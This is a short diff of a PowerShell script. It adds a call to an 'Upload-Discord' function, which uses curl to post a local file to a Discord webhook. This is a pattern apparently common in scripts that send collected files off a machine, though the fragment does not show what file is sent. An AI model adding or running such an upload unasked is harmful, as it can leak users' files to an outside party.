@@ -6,3 +6,5 @@ function Upload-Discord {
 $wh = "https://discord.com/api/webhooks/$wh"
 curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"$path`"" $wh
 }
+
+Upload-Discord
